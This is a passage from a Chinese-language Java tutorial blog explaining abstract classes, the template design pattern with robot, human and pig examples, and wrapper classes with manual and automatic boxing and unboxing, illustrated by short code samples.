class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getConnectInfo</span><span class="params">()</span> &#123;<span class="comment">//方法覆写</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Oracle数据库链接信息&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test20</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Message1</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatabaseMessage1</span>();</span><br><span class="line">        msg.setType(<span class="string">&quot;客户消息&quot;</span>);</span><br><span class="line">        System.out.println(msg.getConnectInfo());</span><br><span class="line">        System.out.println(msg.getType());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    从整体上讲，抽象类只是比普通方法增加了强制性的覆写要求而已，其他的使用过程和传统的类继承完全相同。</p><p>​    <strong>对于抽象类使用的意见：</strong></p><p>​    <strong>1、抽象类使用很大程度上有一个核心的问题：抽象类自己无法直接实例化；</strong></p><p>​    <strong>2、抽象类之中主要的目的是进行过度操作使用，所以当你要使用抽象类进行开发的时候，往往都是在你设计中需要解决类继承问题时所带来的代码重复处理。</strong></p><h5 id="抽象类的相关说明"><a href="#抽象类的相关说明" class="headerlink" title="抽象类的相关说明"></a>抽象类的相关说明</h5><p>​    抽象类是一个重要的面相对象设计的结构，对于抽象类的使用需要注意以下几点问题：</p><p>​    1、在定义抽象类的时候绝对不能够使用final关键字来进行定义，因为抽象类必须有子类，而final定义不能有子类。</p><p>​    2、抽象类是作为一个普通类的加强版出现的（抽象类的组成就是在普通类的基础上扩展而来的，只是追加了抽象方法），既然是在普通类的基础桑上扩展的，那么普通类之中就可以定义属性和方法，那么这些属性一定是要求进行内存空间开辟的，所以抽象类一定可以提供有构造方法，并且子类也一定会按照子类对象的实例化原则进行构造调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Message1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String type;<span class="comment">//消息类型</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Message1</span><span class="params">(String type)</span>&#123;<span class="comment">//类中没有提供无参构造</span></span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">getConnectInfo</span><span class="params">()</span>;<span class="comment">//抽象方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setType</span><span class="params">(String type)</span> &#123;<span class="comment">//普通方法</span></span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getType</span><span class="params">()</span>&#123;<span class="comment">//普通方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DatabaseMessage1</span> <span class="keyword">extends</span> <span class="title class_">Message1</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DatabaseMessage1</span><span class="params">(String str)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getConnectInfo</span><span class="params">()</span> &#123;<span class="comment">//方法覆写</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Oracle数据库链接信息&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test20</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Message1</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatabaseMessage1</span>(<span class="string">&quot;客户消息&quot;</span>);</span><br><span class="line">        System.out.println(msg.getConnectInfo());</span><br><span class="line">        System.out.println(msg.getType());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    3、抽象类中允许没有抽象方法，但是即便没有抽象方法，也无法直接使用关键字new直接实例化抽象对象。</p><p>​    4、抽象类中可以提供有static方法，并且该方法不受到抽象类对象的局限。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Message2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">getInfo</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Message2 <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DatabaseMessage2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DatabaseMessage2</span> <span class="keyword">extends</span> <span class="title class_">Message2</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;数据库链接信息。&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test21</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Message2</span> <span class="variable">msg</span> <span class="operator">=</span> Message2.getInstance();</span><br><span class="line">        System.out.println(msg.getInfo());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <strong>static方法永远不受到实例化对象或结构的限制，永远可以直接通过类名称进行调用。</strong></p><h5 id="模版设计模式"><a href="#模版设计模式" class="headerlink" title="模版设计模式"></a>模版设计模式</h5><p>​    抽象类的本质上就属于一个加强型的类，那么对于类已经清楚了，可以描述一切的有关的现实事务，我们也可以发现，抽象类的设计应该是比类更高一层的定义。下面看一下抽象类的实际应用。</p><p>​    注意，抽象类应该是针对行为进行定义。</p><p>​    假如要描述三类事物：1、机器人：不休息，只知道补充能量和工作；2、人类：需要休息、需要吃饭以及努力的工作；3、猪：需要休息、不需要工作只需要吃饭。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073534.jpg"                      alt="image-20220622101414802"                ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Action</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">EAT</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SLEEP</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">WORK</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">command</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (code) &#123;</span><br><span class="line">            <span class="keyword">case</span> EAT: &#123;</span><br><span class="line">                <span class="built_in">this</span>.eat();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> SLEEP: &#123;</span><br><span class="line">                <span class="built_in">this</span>.sleep();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> WORK: &#123;</span><br><span class="line">                <span class="built_in">this</span>.work();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> EAT + SLEEP + WORK: &#123;</span><br><span class="line">                <span class="built_in">this</span>.eat();</span><br><span class="line">                <span class="built_in">this</span>.sleep();</span><br><span class="line">                <span class="built_in">this</span>.work();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Robot</span> <span class="keyword">extends</span> <span class="title class_">Action</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;机器人需要电源接通充电&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;机器人按固定套路工作&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person10</span> <span class="keyword">extends</span> <span class="title class_">Action</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;饿的时候安静的坐下吃饭&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;安静的躺下慢慢地睡觉&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有想法的工作&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pig</span> <span class="keyword">extends</span> <span class="title class_">Action</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;吃食槽剩饭&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;倒地就睡&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test22</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Action</span> <span class="variable">robotAction</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Robot</span>();</span><br><span class="line">        <span class="type">Action</span> <span class="variable">personAction</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person10</span>();</span><br><span class="line">        <span class="type">Action</span> <span class="variable">pigAction</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pig</span>();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;--------机器人行为--------&quot;</span>);</span><br><span class="line">        robotAction.command(Action.SLEEP);</span><br><span class="line">        robotAction.command(Action.WORK);</span><br><span class="line">        System.out.println(<span class="string">&quot;--------人类行为----------&quot;</span>);</span><br><span class="line">        personAction.command(Action.SLEEP+Action.EAT+ Action.WORK);</span><br><span class="line">        System.out.println(<span class="string">&quot;--------猪类行为----------&quot;</span>);</span><br><span class="line">        pigAction.command(Action.WORK);</span><br><span class="line">        personAction.command(Action.EAT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    现在的程序已经完整的实现了一个行为的抽象处理，但是也需要作出一点点思考。现在定义的Action父类主要的目的是对所有行为规范进行统一处理。</p><p>​    抽象类最大的好吃一是对子类方法的统一管理，二是可以自身提供有一些普通方法并且这些普通方法可以调用抽象方法（抽象方法在有子类提供实现的时候）。</p><hr><h4 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h4><p>​    包装类的主要功能是针对于基本数据类型的对象转换而实现的，并且随着JDK版本的更新，包装类的功能也在改变有着更多的支持。</p><h5 id="包装类实现原理分析"><a href="#包装类实现原理分析" class="headerlink" title="包装类实现原理分析"></a>包装类实现原理分析</h5><p>​    Object类最大的特点是所有类的父类，并且可以接收所有的数据类型，但是在这个过程之中就存在问题：基本数据类型并不是一个类，所以现在如果想要将基本数据类型以类的形式进行处理，那么就需要对其进行包装。</p><p>​    以int数据为例实现一个包装处理的定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Int</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> data;<span class="comment">//包装了一个基本数据类型</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Int</span><span class="params">(<span class="type">int</span> data)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">intValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test23</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//装箱：将基本数据类型保存在包装类之中</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Int</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//拆箱：从包装类对象中获取基本数据类型</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> ((Int)obj).intValue();</span><br><span class="line"></span><br><span class="line">        System.out.println(x * <span class="number">2</span>);<span class="comment">//20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    基本数据类型进行包装处理后可以像对象一样进行引用传递，同时也可以使用Object类来进行接收，但是如果我们都已经可以发现基本数据类型与Objec类型之间的缺陷，那么JDK早就发现了同样的问题，所以就有了包装类的概念。</p><p>​    基本数据类型一共有八种，所以包装类一共有八种。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73536.jpg"                      alt="image-20220622120708743"                ></p><p>​    可以发现在java中包装类一共提供两种类型：</p><p>​    1、对象型包装类(Object直接子类):Boolean、Character；</p><p>​    2、数值型的包装类(Number直接子类):Byte、Short、Integer、Long、Float、Double;</p><p>​    Number是一个抽象类，要是看见了Number都应该明确的表示它是一个数字的概念，这个类定义有如下方法：</p><table><thead><tr><th>No.</th><th>方法名称</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>01</td><td>public byte byteValue()</td><td>普通</td><td>从包装类中获取byte数据</td></tr><tr><td>02</td><td>public short shortValue()</td><td>普通</td><td>从包装类中获取short数据</td></tr><tr><td>03</td><td>public abstract int intValue()</td><td>普通</td><td>从包装类中获取int数据</td></tr><tr><td>04</td><td>public abstract long longValue()</td><td>普通</td><td>从包装类中获取long数据</td></tr><tr><td>05</td><td>public abstract float floatValue()</td><td>普通</td><td>从包装类中获取float数据</td></tr><tr><td>06</td><td>public abstract double doubleValue()</td><td>普通</td><td>从包装类中获取double数据</td></tr></tbody></table><p>​    Number类中的方法就是直接提供有获取包装类中基本数据类型的功能，一共只有六个方法。</p><h5 id="装箱与拆箱"><a href="#装箱与拆箱" class="headerlink" title="装箱与拆箱"></a>装箱与拆箱</h5><p>​    基本数据类型的包装类都是为了基本数据类型转为对象提供的，这样对于基本类型与包装类之间就有了如下关系。</p><p>​    1、数据装箱：将基本数据类型保存到包装类之中，一般可以利用构造方法完成。</p><p>​    -Integer类：public Integer(int value);</p><p>​    -Double类：public Double(double value);</p><p>​    -Boolean类：public Boolean(boolean value);</p><p>​    //以上在JDK1.9废除</p><p>​    2、数据拆箱：从包装类中获取基本数据类型：</p><p>​    -数值型包装类已经由Number类定义了拆箱的方法了</p><p>​    -Boolean型：public boolean booleanValue();</p><p>范例：</p><p>​    1、以int和Integer为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">10</span>);<span class="comment">//装箱</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> obj.intValue();<span class="comment">//拆箱</span></span><br><span class="line">        System.out.println(num*num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    2、以double与Double为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Double</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Double</span>(<span class="number">10.1</span>);<span class="comment">//装箱</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">num</span> <span class="operator">=</span> obj.doubleValue();<span class="comment">//拆箱</span></span><br><span class="line">        System.out.println(num*num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    3、以boolean和Boolean为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="literal">true</span>);<span class="comment">//装箱</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">num</span> <span class="operator">=</span> obj.booleanValue();<span class="comment">//拆箱</span></span><br><span class="line">        System.out.println(num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    可以发现从1.9之后，对于所有包装类之中提供的构造方法就变为了过期处理，不建议用户再继续使用了，这是因为从JDK1.5之后为了方便处理提供了自动的装箱与拆箱操作，所以这种手工的操作被废除了。</p><p>​    自动装箱与拆箱：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="number">10</span>;<span class="comment">//自动装箱，此时不再关心构造方法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> obj;<span class="comment">//自动拆箱</span></span><br><span class="line">        obj++;<span class="comment">//包装类对象可以直接参与数学运算</span></span><br><span class="line">        System.out.println(num*obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    除了提供了自动的数学运算支持之外，使用自动装箱最大的好处是可以实现Object接收基本数据类型的操作。</p><p>​    Object接收小数：</p><p>​    <strong>这是一个错误的程序：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Test24 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Object obj = 19.2;//double自动装箱为Double，向上转型为Object</span><br><span class="line">        obj++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073537.jpg"                      alt="image-20220622232627702"                ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="number">19.2</span>;<span class="comment">//double自动装箱为Double，向上转型为Object</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">num</span> <span class="operator">=</span> (Double)obj;<span class="comment">//向下转型为包装类，再自动拆箱</span></span><br><span class="line">        System.out.println(num*num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    对于包装类需要注意的问题，关于相等判断上：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> 